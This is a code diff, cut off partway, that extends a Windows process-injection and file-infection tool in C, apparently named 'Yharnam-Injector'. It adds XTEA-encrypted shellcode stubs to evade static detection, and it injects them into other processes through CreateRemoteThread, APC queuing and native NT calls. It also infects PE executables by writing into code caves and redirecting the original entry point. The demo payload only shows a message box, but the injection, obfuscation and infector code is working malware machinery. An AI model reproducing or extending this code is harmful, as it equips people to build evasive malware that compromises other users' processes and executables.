@@ -10,6 +10,11 @@
 #define TARGET_PROCESS_NAME "notepad.exe"
 #define STUB_SIZE 64
 #define MESSAGE_TEXT "pwnme 2600"
+#define STATIC_STUB_SIGNATURE "YARN"
+#define STATIC_STUB_SIGNATURE_SIZE 4
+#define STATIC_STUB_SIZE 25
+#define STATIC_STUB_OEP_OFFSET 15
+#define APC_STUB_SIZE 50
 
 // Conditional debug logging
 #ifdef _DEBUG
@@ -55,10 +60,29 @@ typedef NTSTATUS(NTAPI* NtCreateSectionPtr)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIB
 typedef NTSTATUS(NTAPI* NtMapViewOfSectionPtr)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* RtlCreateUserThreadPtr)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
 typedef NTSTATUS(NTAPI* ZwUnmapViewOfSectionPtr)(HANDLE, PVOID);
+typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryPtr)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryPtr)(HANDLE, PVOID, const VOID*, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryPtr)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* NtCreateThreadExPtr)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 
-static BOOL InfectFile(const char* path);
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+typedef struct _NT_FUNCTIONS {
+    NtAllocateVirtualMemoryPtr NtAllocateVirtualMemory;
+    NtWriteVirtualMemoryPtr NtWriteVirtualMemory;
+    NtProtectVirtualMemoryPtr NtProtectVirtualMemory;
+    NtCreateThreadExPtr NtCreateThreadEx;
+} NT_FUNCTIONS;
+
+typedef enum _INJECTION_TECHNIQUE {
+    INJECT_TECHNIQUE_CRT = 0,
+    INJECT_TECHNIQUE_APC,
+    INJECT_TECHNIQUE_SYSCALL
+} INJECTION_TECHNIQUE;
+
+static BOOL InfectFile(const char* path, BOOL useSection);
 static DWORD FindTargetPid(const char* name);
-static BOOL InjectPid(DWORD pid);
+static BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique);
 static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName);
 
 /**
@@ -177,6 +201,138 @@ static void* LoadShellcode(DWORD* outSize) {
     return decoded_shellcode;
 }
 
+/**
+ * \fn static uint32_t Fnv1a32(const uint8_t* data, size_t len)
+ * \brief Compute a small runtime-derived key component using FNV-1a.
+ */
+static uint32_t Fnv1a32(const uint8_t* data, size_t len) {
+    uint32_t hash = 2166136261u;
+    for (size_t i = 0; i < len; i++) {
+        hash ^= data[i];
+        hash *= 16777619u;
+    }
+    return hash;
+}
+
+/**
+ * \fn static void DeriveKey(uint32_t key[4])
+ * \brief Derive a 128-bit key at runtime from a static seed.
+ */
+static void DeriveKey(uint32_t key[4]) {
+    static const uint8_t seed[] = "Yharnam-Injector-Key";
+    const uint32_t h = Fnv1a32(seed, sizeof(seed) - 1);
+    key[0] = 0xA3B1BAC6u ^ h;
+    key[1] = 0x56AA3350u + h;
+    key[2] = 0x677D9197u ^ (h << 1);
+    key[3] = 0xB27022DCu + (h << 2);
+}
+
+/**
+ * \fn static void XteaEncryptBlock(uint32_t v[2], const uint32_t key[4])
+ * \brief Encrypt a single 64-bit block with XTEA (32 rounds).
+ */
+static void XteaEncryptBlock(uint32_t v[2], const uint32_t key[4]) {
+    uint32_t v0 = v[0], v1 = v[1];
+    uint32_t sum = 0;
+    const uint32_t delta = 0x9E3779B9u;
+    for (uint32_t i = 0; i < 32; i++) {
+        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
+        sum += delta;
+        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
+    }
+    v[0] = v0;
+    v[1] = v1;
+}
+
+/**
+ * \fn static void XteaCryptCtr(BYTE* data, size_t len)
+ * \brief Encrypt/decrypt a buffer using XTEA in CTR mode.
+ */
+static void XteaCryptCtr(BYTE* data, size_t len) {
+    static const uint64_t nonce = 0x6E6F6E6365596859ULL; // obfuscated nonce
+    uint32_t key[4];
+    DeriveKey(key);
+
+    uint64_t counter = nonce;
+    size_t offset = 0;
+    while (offset < len) {
+        uint32_t block[2] = { (uint32_t)counter, (uint32_t)(counter >> 32) };
+        BYTE stream[8];
+        XteaEncryptBlock(block, key);
+        memcpy(stream, block, sizeof(stream));
+        size_t chunk = min(len - offset, sizeof(stream));
+        for (size_t i = 0; i < chunk; i++) {
+            data[offset + i] ^= stream[i];
+        }
+        counter++;
+        offset += chunk;
+    }
+}
+
+static void DecryptPayload(BYTE* dst, const BYTE* src, size_t len) {
+    memcpy(dst, src, len);
+    XteaCryptCtr(dst, len);
+}
+
+static const BYTE encrypted_message[] = {
+    0xEE, 0x1D, 0x3E, 0xE4, 0x1B, 0x69, 0x20, 0x38, 0x3F, 0x4B, 0x23
+};
+
+static const BYTE encrypted_crt_stub[STUB_SIZE] = {
+    0xD6, 0x5B, 0x99, 0xC1, 0xC4, 0x49, 0x12, 0x0E, 0x0F, 0x7B, 0x23, 0x56, 0x29, 0x6D, 0xD1, 0x4E,
+    0x40, 0x90, 0x81, 0x11, 0x43, 0x7E, 0xD8, 0x35, 0x84, 0x14, 0x47, 0x3A, 0x85, 0x79, 0x01, 0x35,
+    0x15, 0x12, 0xB5, 0x6A, 0x0A, 0x31, 0xE8, 0xD9, 0x96, 0x94, 0x54, 0x81, 0x45, 0xD9, 0x8E, 0xC8,
+    0xBB, 0x21, 0xEE, 0x40, 0xC1, 0x49, 0x5F, 0x34, 0x4E, 0xAB, 0xFA, 0x4C, 0xA8, 0xDF, 0x60, 0x6C
+};
+
+static const BYTE encrypted_apc_stub[APC_STUB_SIZE] = {
+    0xD6, 0x5B, 0x99, 0xC1, 0xC4, 0x49, 0x12, 0x0E, 0x0F, 0x7B, 0x23, 0x56, 0x29, 0x6D, 0xD1, 0x4E,
+    0x40, 0x90, 0x81, 0x11, 0x43, 0x7E, 0xD8, 0x35, 0x84, 0x14, 0x47, 0x3A, 0x85, 0x79, 0x01, 0x35,
+    0x15, 0x12, 0xB5, 0x6A, 0x0A, 0x31, 0xE8, 0xD9, 0x96, 0x94, 0x54, 0x81, 0x45, 0xD9, 0x8E, 0xC8,
+    0xBB, 0xAA
+};
+
+static const BYTE encrypted_static_stub[STATIC_STUB_SIZE] = {
+    0xFB, 0x22, 0xDB, 0x8D, 0x5B, 0x29, 0x12, 0x0E, 0x0F, 0x33, 0xA8, 0x16, 0x39, 0x6C, 0x6C, 0x4E,
+    0x40, 0x90, 0x81, 0xEE, 0xA3, 0x27, 0x99, 0x26, 0x73
+};
+
+static BOOL BuildRemoteStubCrt(BYTE* stub, size_t size, LPVOID remoteMsg, uintptr_t msgAddr, uintptr_t exitAddr) {
+    if (size != STUB_SIZE) {
+        return FALSE;
+    }
+    DecryptPayload(stub, encrypted_crt_stub, size);
+    const UINT32 mbOK = MB_OK;
+    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg));
+    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg));
+    memcpy(stub + 25, &mbOK, sizeof(mbOK));
+    memcpy(stub + 35, &msgAddr, sizeof(msgAddr));
+    memcpy(stub + 54, &exitAddr, sizeof(exitAddr));
+    return TRUE;
+}
+
+static BOOL BuildRemoteStubApc(BYTE* stub, size_t size, LPVOID remoteMsg, uintptr_t msgAddr) {
+    if (size != APC_STUB_SIZE) {
+        return FALSE;
+    }
+    DecryptPayload(stub, encrypted_apc_stub, size);
+    const UINT32 mbOK = MB_OK;
+    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg));
+    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg));
+    memcpy(stub + 25, &mbOK, sizeof(mbOK));
+    memcpy(stub + 35, &msgAddr, sizeof(msgAddr));
+    return TRUE;
+}
+
+static BOOL BuildStaticStub(BYTE* stub, size_t size, DWORD originalEntryRva) {
+    if (size != STATIC_STUB_SIZE) {
+        return FALSE;
+    }
+    DecryptPayload(stub, encrypted_static_stub, size);
+    memcpy(stub + STATIC_STUB_OEP_OFFSET, &originalEntryRva, sizeof(originalEntryRva));
+    return TRUE;
+}
+
 
 /**
  * \fn uintptr_t GetRemoteProcAddress(DWORD pid, const char* dll, const char* fn)
@@ -259,6 +415,64 @@ static DWORD AlignUp(DWORD val, DWORD align) {
     return (val + align - 1) & ~(align - 1);
 }
 
+static BOOL RvaToFileOffset(const IMAGE_SECTION_HEADER* secs, WORD nsec, DWORD rva, DWORD* outOffset) {
+    if (!secs || !outOffset) return FALSE;
+    for (WORD i = 0; i < nsec; i++) {
+        DWORD va = secs[i].VirtualAddress;
+        DWORD size = secs[i].SizeOfRawData;
+        if (size == 0) {
+            continue;
+        }
+        if (rva >= va && rva < va + size) {
+            *outOffset = secs[i].PointerToRawData + (rva - va);
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+static BOOL IsCaveByte(BYTE value) {
+    return value == 0x00 || value == 0xCC || value == 0x90;
+}
+
+static BOOL FindCodeCave(
+    const IMAGE_SECTION_HEADER* secs,
+    WORD nsec,
+    const BYTE* fileData,
+    DWORD fileSize,
+    DWORD payloadSize,
+    DWORD* outRva,
+    DWORD* outFileOffset
+) {
+    if (!secs || !fileData || !outRva || !outFileOffset) return FALSE;
+    for (WORD i = 0; i < nsec; i++) {
+        if ((secs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) {
+            continue;
+        }
+        DWORD rawStart = secs[i].PointerToRawData;
+        DWORD rawSize = secs[i].SizeOfRawData;
+        if (rawStart >= fileSize || rawSize > fileSize - rawStart || rawSize < payloadSize) {
+            continue;
+        }
+        DWORD run = 0;
+        for (DWORD offset = 0; offset < rawSize; offset++) {
+            if (IsCaveByte(fileData[rawStart + offset])) {
+                run++;
+                if (run >= payloadSize) {
+                    DWORD caveOffset = offset + 1 - run;
+                    *outRva = secs[i].VirtualAddress + caveOffset;
+                    *outFileOffset = rawStart + caveOffset;
+                    return TRUE;
+                }
+            }
+            else {
+                run = 0;
+            }
+        }
+    }
+    return FALSE;
+}
+
 
 /**
  * \fn static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName)
@@ -331,25 +545,134 @@ static DWORD64 GetRemoteAddressByRVA(DWORD pid, const char* moduleName, FARPROC 
     return (DWORD64)remoteBase + offset;
 }
 
+static BOOL ResolveNtFunctions(NT_FUNCTIONS* nt) {
+    if (!nt) return FALSE;
+    memset(nt, 0, sizeof(*nt));
 
-
-/**
- * \fn static BOOL InjectPid(DWORD pid)
- * \brief Inject and execute a small stub in a remote process to display a MessageBox.
- *
- * \param pid Process ID of the target process.
- * \return TRUE on successful injection and thread creation, FALSE otherwise.
- */
-BOOL InjectPid(DWORD pid) {
-    printf("[DEBUG] InjectPid: entry pid=%u\n", pid);
-
-    DWORD mySess = 0, peerSess = 0;
-    ProcessIdToSessionId(GetCurrentProcessId(), &mySess);
-    if (!ProcessIdToSessionId(pid, &peerSess) || peerSess != mySess) {
-        printf(" [DEBUG] skip pid=%u (sess %u!=%u)\n", pid, peerSess, mySess);
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        printf(" [ERROR] GetModuleHandleA(ntdll.dll) failed\n");
         return FALSE;
     }
 
+    nt->NtAllocateVirtualMemory = (NtAllocateVirtualMemoryPtr)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    nt->NtWriteVirtualMemory = (NtWriteVirtualMemoryPtr)GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    nt->NtProtectVirtualMemory = (NtProtectVirtualMemoryPtr)GetProcAddress(ntdll, "NtProtectVirtualMemory");
+    nt->NtCreateThreadEx = (NtCreateThreadExPtr)GetProcAddress(ntdll, "NtCreateThreadEx");
+
+    return nt->NtAllocateVirtualMemory && nt->NtWriteVirtualMemory && nt->NtProtectVirtualMemory;
+}
+
+static BOOL RemoteAllocWrite(
+    HANDLE hProc,
+    const void* data,
+    SIZE_T size,
+    DWORD allocProtect,
+    DWORD finalProtect,
+    BOOL useSyscalls,
+    const NT_FUNCTIONS* nt,
+    LPVOID* outRemote
+) {
+    if (!outRemote || !data || size == 0) {
+        return FALSE;
+    }
+
+    LPVOID remote = NULL;
+    SIZE_T regionSize = size;
+    if (useSyscalls && nt && nt->NtAllocateVirtualMemory) {
+        NTSTATUS status = nt->NtAllocateVirtualMemory(
+            hProc, (PVOID*)&remote, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, allocProtect);
+        if (!NT_SUCCESS(status) || !remote) {
+            printf(" [ERROR] NtAllocateVirtualMemory failed: 0x%08X\n", status);
+            return FALSE;
+        }
+    }
+    else {
+        remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, allocProtect);
+        if (!remote) {
+            printf(" [ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
+            return FALSE;
+        }
+    }
+
+    if (useSyscalls && nt && nt->NtWriteVirtualMemory) {
+        ULONG written = 0;
+        NTSTATUS status = nt->NtWriteVirtualMemory(
+            hProc, remote, data, (ULONG)size, &written);
+        if (!NT_SUCCESS(status) || written != size) {
+            printf(" [ERROR] NtWriteVirtualMemory failed: 0x%08X\n", status);
+            return FALSE;
+        }
+    }
+    else {
+        SIZE_T written = 0;
+        if (!WriteProcessMemory(hProc, remote, data, size, &written) || written != size) {
+            printf(" [ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
+            return FALSE;
+        }
+    }
+
+    if (finalProtect != allocProtect) {
+        DWORD oldProtect = 0;
+        if (useSyscalls && nt && nt->NtProtectVirtualMemory) {
+            PVOID protectAddr = remote;
+            SIZE_T protectSize = regionSize;
+            NTSTATUS status = nt->NtProtectVirtualMemory(
+                hProc, &protectAddr, &protectSize, finalProtect, &oldProtect);
+            if (!NT_SUCCESS(status)) {
+                printf(" [WARN] NtProtectVirtualMemory failed: 0x%08X\n", status);
+            }
+        }
+        else {
+            if (!VirtualProtectEx(hProc, remote, size, finalProtect, &oldProtect)) {
+                printf(" [WARN] VirtualProtectEx failed: %lu\n", GetLastError());
+            }
+        }
+    }
+
+    *outRemote = remote;
+    return TRUE;
+}
+
+static BOOL FindTargetThread(DWORD pid, DWORD* outTid) {
+    if (!outTid) return FALSE;
+    *outTid = 0;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        printf(" [ERROR] Thread snapshot failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    THREADENTRY32 te = { sizeof(te) };
+    if (!Thread32First(snapshot, &te)) {
+        printf(" [ERROR] Thread32First failed: %lu\n", GetLastError());
+        CloseHandle(snapshot);
+        return FALSE;
+    }
+
+    do {
+        if (te.th32OwnerProcessID == pid) {
+            *outTid = te.th32ThreadID;
+            break;
+        }
+    } while (Thread32Next(snapshot, &te));
+
+    CloseHandle(snapshot);
+    return *outTid != 0;
+}
+
+static BOOL LoadDecodedMessage(char* outMsg, size_t outSize) {
+    if (!outMsg || outSize < sizeof(encrypted_message)) {
+        return FALSE;
+    }
+    DecryptPayload((BYTE*)outMsg, encrypted_message, sizeof(encrypted_message));
+    return TRUE;
+}
+
+
+
+static BOOL InjectPidCreateRemoteThread(DWORD pid, BOOL useSyscalls, const NT_FUNCTIONS* nt, BOOL useNtThread) {
     HANDLE hProc = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
@@ -360,21 +683,26 @@ BOOL InjectPid(DWORD pid) {
     }
     printf(" [DEBUG] OpenProcess succeeded: hProc=%p\n", hProc);
 
-    // XOR encoded message string with key 0xAB to obfuscate it
-    const char encoded_msg[] = {0xDB, 0xDC, 0xC5, 0xC6, 0xCE, 0x8B, 0x99, 0x9D, 0x9B, 0x9B, 0xAB}; // "pwnme 2600" XOR 0xAB
-    char decoded_msg[sizeof(encoded_msg)];
-    
-    // Decode the message at runtime
-    for (size_t i = 0; i < sizeof(encoded_msg); i++) {
-        decoded_msg[i] = encoded_msg[i] ^ 0xAB;
+    char decoded_msg[sizeof(encrypted_message)];
+    if (!LoadDecodedMessage(decoded_msg, sizeof(decoded_msg))) {
+        CloseHandle(hProc);
+        return FALSE;
     }
-    
-    SIZE_T msgLen = sizeof(decoded_msg);
-    LPVOID remoteMsg = VirtualAllocEx(hProc, NULL, msgLen,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    WriteProcessMemory(hProc, remoteMsg, decoded_msg, msgLen, &msgLen);
 
-    printf(" [DEBUG] wrote %zu bytes to remoteMsg=%p\n", msgLen, remoteMsg);
+    LPVOID remoteMsg = NULL;
+    if (!RemoteAllocWrite(
+        hProc,
+        decoded_msg,
+        sizeof(decoded_msg),
+        PAGE_READWRITE,
+        PAGE_READWRITE,
+        useSyscalls,
+        nt,
+        &remoteMsg)) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    printf(" [DEBUG] wrote %zu bytes to remoteMsg=%p\n", sizeof(decoded_msg), remoteMsg);
 
     HMODULE u32 = LoadLibraryA("user32.dll");
     FARPROC pMsg = GetProcAddress(u32, "MessageBoxA");
@@ -387,74 +715,53 @@ BOOL InjectPid(DWORD pid) {
         return FALSE;
     }
 
-    //    build the 64-byte x64 stub (XOR encoded with key 0xAB)
-    //    slot1 @ + 5:  pointer to remoteMsg  (rdx)
-    //    slot2 @ +15:  pointer to remoteMsg  (r8)
-    //    slot3 @ +25:  MB_OK                (r9d)
-    //    slot4 @ +35:  MessageBoxA address  (rax)
-    //    slot5 @ +56:  ExitThread address   (rax)
-    BYTE encoded_stub[64] = {
-      0x48^0xAB,0x31^0xAB,0xC9^0xAB,             // xor    rcx,rcx
-      0x48^0xAB,0xBA^0xAB, 0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB, // mov    rdx,slot1
-      0x49^0xAB,0xB8^0xAB, 0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB, // mov    r8, slot2
-      0x41^0xAB,0xB9^0xAB, 0^0xAB,0^0xAB,0^0xAB,0^0xAB,             // mov    r9d,slot3
-      0x48^0xAB,0x83^0xAB,0xEC^0xAB,0x28^0xAB,                    // sub    rsp,0x28
-      0x48^0xAB,0xB8^0xAB, 0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB, // mov    rax,slot4
-      0xFF^0xAB,0xD0^0xAB,                              // call   rax
-      0x48^0xAB,0x83^0xAB,0xC4^0xAB,0x28^0xAB,                    // add    rsp,0x28
-      0x48^0xAB,0x31^0xAB,0xC9^0xAB,                         // xor    rcx,rcx
-      0x48^0xAB,0xB8^0xAB, 0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB,0^0xAB, // mov    rax,slot5
-      0xFF^0xAB,0xD0^0xAB                               // call   rax
-    };
-    
-    // Decode the stub at runtime
-    BYTE stub[64];
-    for (int i = 0; i < 64; i++) {
-        stub[i] = encoded_stub[i] ^ 0xAB;
-    }
-
-    const UINT32 mbOK = MB_OK;
-    memcpy(stub + 5, &remoteMsg, sizeof(remoteMsg)); // slot1
-    memcpy(stub + 15, &remoteMsg, sizeof(remoteMsg)); // slot2
-    memcpy(stub + 25, &mbOK, sizeof(mbOK));     // slot3
-    memcpy(stub + 35, &rMsg, sizeof(rMsg));     // slot4
-    memcpy(stub + 56, &rExit, sizeof(rExit));    // slot5
-
-    printf(" [DEBUG] stub bytes:\n    ");
-    for (int i = 0; i < STUB_SIZE; i++) {
-        printf("%02X ", stub[i]);
-        if ((i & 15) == 15) printf("\n    ");
-    }
-    printf("\n");
-
-    // write & execute stub with better security practices
-    // First allocate as PAGE_READWRITE, then change to PAGE_EXECUTE_READ
-    LPVOID remoteThunk = VirtualAllocEx(hProc, NULL, STUB_SIZE,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remoteThunk) {
-        printf(" [ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
+    BYTE stub[STUB_SIZE];
+    if (!BuildRemoteStubCrt(stub, sizeof(stub), remoteMsg, (uintptr_t)rMsg, (uintptr_t)rExit)) {
         CloseHandle(hProc);
         return FALSE;
     }
-    
-    if (!WriteProcessMemory(hProc, remoteThunk, stub, STUB_SIZE, NULL)) {
-        printf(" [ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
+
+    LPVOID remoteThunk = NULL;
+    if (!RemoteAllocWrite(
+        hProc,
+        stub,
+        sizeof(stub),
+        PAGE_READWRITE,
+        PAGE_EXECUTE_READ,
+        useSyscalls,
+        nt,
+        &remoteThunk)) {
         CloseHandle(hProc);
         return FALSE;
     }
     printf(" [DEBUG] Wrote stub to remoteThunk=%p\n", remoteThunk);
-    
-    // Change memory protection to execute+read only
-    DWORD oldProtect;
-    if (!VirtualProtectEx(hProc, remoteThunk, STUB_SIZE, PAGE_EXECUTE_READ, &oldProtect)) {
-        printf(" [WARN] VirtualProtectEx failed: %lu\n", GetLastError());
-        // Continue anyway as some processes might still work
+
+    HANDLE hTh = NULL;
+    if (useNtThread && nt && nt->NtCreateThreadEx) {
+        NTSTATUS status = nt->NtCreateThreadEx(
+            &hTh,
+            THREAD_ALL_ACCESS,
+            NULL,
+            hProc,
+            (PVOID)remoteThunk,
+            NULL,
+            0,
+            0,
+            0,
+            0,
+            NULL);
+        if (!NT_SUCCESS(status)) {
+            printf(" [WARN] NtCreateThreadEx failed: 0x%08X\n", status);
+            hTh = NULL;
+        }
     }
 
-    HANDLE hTh = CreateRemoteThread(
-        hProc, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remoteThunk,
-        NULL, 0, NULL);
+    if (!hTh) {
+        hTh = CreateRemoteThread(
+            hProc, NULL, 0,
+            (LPTHREAD_START_ROUTINE)remoteThunk,
+            NULL, 0, NULL);
+    }
     if (!hTh) {
         printf(" [ERROR] CreateRemoteThread: %lu\n", GetLastError());
         CloseHandle(hProc);
@@ -465,6 +772,129 @@ BOOL InjectPid(DWORD pid) {
     CloseHandle(hTh);
     CloseHandle(hProc);
     return TRUE;
+}
+
+static BOOL InjectPidApc(DWORD pid) {
+    HANDLE hProc = OpenProcess(
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        FALSE, pid);
+    if (!hProc) {
+        printf(" [WARN] OpenProcess(%u): %lu\n", pid, GetLastError());
+        return FALSE;
+    }
+
+    char decoded_msg[sizeof(encrypted_message)];
+    if (!LoadDecodedMessage(decoded_msg, sizeof(decoded_msg))) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    LPVOID remoteMsg = NULL;
+    if (!RemoteAllocWrite(
+        hProc,
+        decoded_msg,
+        sizeof(decoded_msg),
+        PAGE_READWRITE,
+        PAGE_READWRITE,
+        FALSE,
+        NULL,
+        &remoteMsg)) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    HMODULE u32 = LoadLibraryA("user32.dll");
+    FARPROC pMsg = GetProcAddress(u32, "MessageBoxA");
+    DWORD64 rMsg = GetRemoteAddressByRVA(pid, "user32.dll", pMsg);
+    printf(" [DEBUG] remote MessageBoxA=%llx\n", rMsg);
+    if (!rMsg) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    BYTE stub[APC_STUB_SIZE];
+    if (!BuildRemoteStubApc(stub, sizeof(stub), remoteMsg, (uintptr_t)rMsg)) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    LPVOID remoteThunk = NULL;
+    if (!RemoteAllocWrite(
+        hProc,
+        stub,
+        sizeof(stub),
+        PAGE_READWRITE,
+        PAGE_EXECUTE_READ,
+        FALSE,
+        NULL,
+        &remoteThunk)) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    DWORD tid = 0;
+    if (!FindTargetThread(pid, &tid)) {
+        printf(" [ERROR] No thread found for APC injection\n");
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
+    if (!hThread) {
+        printf(" [ERROR] OpenThread(%u) failed: %lu\n", tid, GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    if (QueueUserAPC((PAPCFUNC)remoteThunk, hThread, 0) == 0) {
+        printf(" [ERROR] QueueUserAPC failed: %lu\n", GetLastError());
+        CloseHandle(hThread);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    printf(" [DEBUG] Queued APC on TID=%u\n", tid);
+
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return TRUE;
+}
+
+static BOOL InjectPidSyscall(DWORD pid) {
+    NT_FUNCTIONS nt = { 0 };
+    if (!ResolveNtFunctions(&nt)) {
+        printf(" [WARN] Nt* syscall path unavailable, falling back to CRT\n");
+        return InjectPidCreateRemoteThread(pid, FALSE, NULL, FALSE);
+    }
+    return InjectPidCreateRemoteThread(pid, TRUE, &nt, nt.NtCreateThreadEx != NULL);
+}
+
+/**
+ * \fn static BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique)
+ * \brief Inject and execute a small stub in a remote process to display a MessageBox.
+ *
+ * \param pid Process ID of the target process.
+ * \param technique Injection technique to use.
+ * \return TRUE on successful injection and thread creation, FALSE otherwise.
+ */
+BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique) {
+    printf("[DEBUG] InjectPid: entry pid=%u\n", pid);
+
+    DWORD mySess = 0, peerSess = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &mySess);
+    if (!ProcessIdToSessionId(pid, &peerSess) || peerSess != mySess) {
+        printf(" [DEBUG] skip pid=%u (sess %u!=%u)\n", pid, peerSess, mySess);
+        return FALSE;
+    }
+
+    switch (technique) {
+    case INJECT_TECHNIQUE_APC:
+        return InjectPidApc(pid);
+    case INJECT_TECHNIQUE_SYSCALL:
+        return InjectPidSyscall(pid);
+    case INJECT_TECHNIQUE_CRT:
+    default:
+        return InjectPidCreateRemoteThread(pid, FALSE, NULL, FALSE);
+    }
 }
 
 
@@ -490,16 +920,26 @@ DWORD FindTargetPid(const char* name) {
     base = base ? base + 1 : selfName;
     
     if (name) {
-        while (Process32Next(processSnapshot, &pe)) {
+        if (!Process32First(processSnapshot, &pe)) {
+            printf("[ERROR] FindTargetPid: Process32First failed\n");
+            CloseHandle(processSnapshot);
+            return 0;
+        }
+        do {
             printf("[DEBUG] FindTargetPid: checking %s (PID=%u)\n", pe.szExeFile, pe.th32ProcessID);
             if (!_stricmp(pe.szExeFile, name)) { 
                 pid = pe.th32ProcessID; 
                 break; 
             }
-        }
+        } while (Process32Next(processSnapshot, &pe));
     }
     if (!pid) {
-        while (Process32Next(processSnapshot, &pe)) {
+        if (!Process32First(processSnapshot, &pe)) {
+            printf("[ERROR] FindTargetPid: Process32First failed\n");
+            CloseHandle(processSnapshot);
+            return 0;
+        }
+        do {
             if (pe.th32ProcessID <= 4) continue;
             if (!_stricmp(pe.szExeFile, base)) continue;
             HANDLE hTest = OpenProcess(PROCESS_CREATE_THREAD, FALSE, pe.th32ProcessID);
@@ -509,7 +949,7 @@ DWORD FindTargetPid(const char* name) {
                 CloseHandle(hTest); 
                 break; 
             }
-        }
+        } while (Process32Next(processSnapshot, &pe));
     }
     CloseHandle(processSnapshot);
     printf("[DEBUG] FindTargetPid: exit -> %u\n", pid);
@@ -517,13 +957,14 @@ DWORD FindTargetPid(const char* name) {
 }
 
 /**
- * \fn static BOOL InfectFile(const char* path)
- * \brief Append a new section to a PE file and inject shellcode into it.
+ * \fn static BOOL InfectFile(const char* path, BOOL useSection)
+ * \brief Infect a PE file via code cave (default) or new section injection.
  *
  * \param path File path of the target PE executable.
+ * \param useSection When TRUE, force new section infection instead of code cave.
  * \return TRUE on successful infection, FALSE on failure or if already infected.
  */
-static BOOL InfectFile(const char* path) {
+static BOOL InfectFile(const char* path, BOOL useSection) {
     printf("[DEBUG] InfectFile: path=%s\n", path);
 
     HANDLE hFile = CreateFileA(
@@ -537,6 +978,13 @@ static BOOL InfectFile(const char* path) {
     );
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[ERROR] CreateFileA(%s) failed: 0x%08X\n", path, GetLastError());
+        return FALSE;
+    }
+
+    DWORD fileEnd = GetFileSize(hFile, NULL);
+    if (fileEnd == INVALID_FILE_SIZE || fileEnd == 0) {
+        printf("[ERROR] GetFileSize failed\n");
+        CloseHandle(hFile);
         return FALSE;
     }
 
@@ -584,44 +1032,128 @@ static BOOL InfectFile(const char* path) {
         return FALSE;
     }
 
+    BYTE* fileData = malloc(fileEnd);
+    if (!fileData) {
+        printf("[ERROR] malloc failed\n");
+        free(secs);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    if (!ReadFile(hFile, fileData, fileEnd, &rd, NULL) || rd != fileEnd) {
+        printf("[ERROR] ReadFile file data failed\n");
+        free(fileData);
+        free(secs);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
